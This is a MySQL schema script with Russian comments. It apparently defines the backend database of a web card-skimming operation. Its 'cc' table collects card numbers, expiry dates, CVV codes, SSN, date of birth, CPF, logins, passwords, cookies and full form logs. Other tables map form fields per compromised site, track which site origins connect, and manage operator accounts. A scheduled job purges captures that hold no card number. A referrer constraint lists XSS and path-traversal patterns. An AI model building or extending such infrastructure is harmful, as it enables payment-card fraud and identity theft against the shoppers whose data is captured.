-- SQL скрипт для создания таблиц



-- Таблица allowed_pages
CREATE TABLE IF NOT EXISTS allowed_pages (
    id INT AUTO_INCREMENT PRIMARY KEY,
    domain VARCHAR(255),
    page VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE INDEX idx_domain_page (domain, page)
);
-- Таблица cc
CREATE TABLE IF NOT EXISTS cc (
    id INT PRIMARY KEY,
    type TEXT NULL,
    payment_cc_number VARCHAR(255) NULL,
    payment_cc_exp_month VARCHAR(500) NULL,
    payment_cc_exp_year VARCHAR(500) NULL,
    payment_cc_cid VARCHAR(500) NULL,
    payment_cc_owner VARCHAR(500) NULL,
    billing_country_id VARCHAR(500) NULL,
    billing_state VARCHAR(255) NULL,
    billing_city VARCHAR(500) NULL,
    billing_street VARCHAR(500) NULL,
    billing_postcode VARCHAR(500) NULL,
    billing_firstname VARCHAR(500) NULL,
    billing_lastname VARCHAR(500) NULL,
    billing_telephone VARCHAR(500) NULL,
    billing_email VARCHAR(500) NULL,
    SSN VARCHAR(500) NULL,
    DOB VARCHAR(500) NULL,
    CPF VARCHAR(500) NULL,
    Other VARCHAR(500) NULL,
    date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status TEXT NULL,
    ua LONGTEXT NULL,
    ip VARCHAR(255) NULL,
    uniquecookies VARCHAR(255) NULL,
    fulldatalog LONGTEXT NULL,
    url_id VARCHAR(255) NULL,
    login VARCHAR(255) NULL,
    password VARCHAR(255) NULL,
    userid TEXT NULL,
    hash VARCHAR(32)
);


-- Таблица field_mappings
CREATE TABLE IF NOT EXISTS field_mappings (
    url_id VARCHAR(255) NULL,
    field_key VARCHAR(255) NULL,
    assign_as VARCHAR(255) NULL,
    block VARCHAR(10) NULL
);

-- Таблица full_log
CREATE TABLE IF NOT EXISTS full_log (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_cookie VARCHAR(255) NULL,
    data LONGTEXT NULL,
    ip_address VARCHAR(255) NULL,
    referrer VARCHAR(255) NULL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    useragent VARCHAR(255) NULL
);

-- Таблица users
CREATE TABLE IF NOT EXISTS users (
    id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(30),
    password VARCHAR(255),
    secret VARCHAR(255),
    role ENUM('admin', 'user','tech') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Таблица user_sites
CREATE TABLE IF NOT EXISTS user_sites (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT UNSIGNED,
    url_id VARCHAR(255),
    FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS site_activity (
    id INT AUTO_INCREMENT PRIMARY KEY,
    site_origin VARCHAR(255) UNIQUE,
    last_connection_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    connection_after_access TIMESTAMP NULL DEFAULT NULL
);

CREATE UNIQUE INDEX idx_uniquecookies ON cc (uniquecookies);
CREATE INDEX idx_domain ON allowed_pages(domain);
CREATE INDEX idx_page ON allowed_pages(page);

CREATE INDEX idx_user_cookie ON full_log(user_cookie);
CREATE INDEX idx_ip_address ON full_log(ip_address);

CREATE INDEX idx_site_origin ON site_activity(site_origin);


DELIMITER //

CREATE EVENT IF NOT EXISTS `delete_old_records`
ON SCHEDULE EVERY 781 MINUTE
STARTS CURRENT_TIMESTAMP
DO
BEGIN
    START TRANSACTION; -- Начало транзакции
    DELETE FROM full_log
    WHERE EXISTS (
        SELECT 1 FROM cc
        WHERE cc.id = full_log.id
        AND cc.payment_cc_number IS NULL
        AND cc.date <= (NOW() - INTERVAL 2 DAY)
    );
    DELETE FROM cc
    WHERE payment_cc_number IS NULL
    AND date <= (NOW() - INTERVAL 2 DAY);
    COMMIT; -- Подтверждение транзакции
END; //

DELIMITER ;

ALTER TABLE full_log
MODIFY useragent LONGTEXT NULL;

ALTER TABLE full_log
ADD CONSTRAINT check_referrer
CHECK (

    referrer NOT LIKE '%<%' AND 
    referrer NOT LIKE '%>%' AND
    
    referrer NOT LIKE '%javascript:%' AND
    referrer NOT LIKE '%vbscript:%' AND
    referrer NOT LIKE '%livescript:%' AND
    referrer NOT LIKE '%data:%' AND
    referrer NOT LIKE '%file:%' AND
    referrer NOT LIKE '%blob:%' AND
    

    referrer NOT LIKE '%../%' AND
    

    referrer NOT REGEXP '[\\[\\]{}()\'"`]' AND

    LENGTH(referrer) <= 255
);